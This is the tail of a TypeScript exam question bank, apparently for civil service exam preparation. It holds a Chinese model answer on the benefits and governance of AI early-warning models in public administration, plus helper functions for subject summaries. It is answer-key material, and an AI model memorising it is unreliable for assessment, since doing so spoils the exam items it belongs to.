          <section class="answer-block"><h3>AI 預警模型效益與管理配套</h3><p>導入 AI 預警模型後，可從大量資料中找出人力難以即時辨識的異常與趨勢，例如案件逾期風險、重複申請、文件異常、服務量暴增、資源不足、潛在違規樣態或高風險事件。模型可協助主管提早配置人力、優先處理高風險案件、改善流程瓶頸、降低錯誤與縮短反應時間。其定位應是輔助判斷與預警，而非自動作成行政處分。</p><p>資料偏誤方面，模型訓練資料若反映歷史偏差、特定族群樣本不足或來源資料品質不佳，可能導致不公平預警。因此應進行資料代表性檢查、偏誤測試、特徵合理性審查、定期再訓練與模型監控。不得使用與業務目的無關或可能造成歧視的敏感特徵。</p><p>模型誤判方面，應設定人工複核、申訴更正、錯誤案例回饋與風險分級機制。AI 預警只能提示承辦人注意，不能單憑模型分數拒絕申請或作成不利處分。可解釋性方面，系統應提供主要影響因素、資料來源、模型版本、預警時間與處理紀錄，讓承辦人能理解並向民眾說明。</p><p>責任歸屬方面，組織需明確規範資料提供單位、模型開發單位、系統維運單位、業務使用單位與決策主管的責任。民眾權益保障方面，應建立告知、查詢、更正、人工審查、申訴與救濟機制，並定期由資安、法制、個資保護與外部稽核檢視模型使用是否符合比例原則、目的限制與公平性要求。</p></section>`
  }
] satisfies ExamQuestion[];

export const subjectSummaries = Array.from(
  questions.reduce((map, question) => {
    const existing = map.get(question.subjectSlug);
    if (existing) {
      existing.count += 1;
      existing.questionIds.push(question.id);
      return map;
    }

    map.set(question.subjectSlug, {
      slug: question.subjectSlug,
      year: question.year,
      examName: question.examName,
      grade: question.grade,
      category: question.category,
      subject: question.subject,
      count: 1,
      questionIds: [question.id],
    });
    return map;
  }, new Map<string, {
    slug: string;
    year: string;
    examName: string;
    grade: string;
    category: string;
    subject: string;
    count: number;
    questionIds: number[];
  }>())
  .values(),
);

export function getQuestionBySlug(slug: string) {
  return questions.find((question) => question.slug === slug);
}

export function getSubjectBySlug(slug: string) {
  const summary = subjectSummaries.find((subject) => subject.slug === slug);
  if (!summary) return undefined;
  return {
    ...summary,
    questions: questions.filter((question) => question.subjectSlug === slug),
  };
}
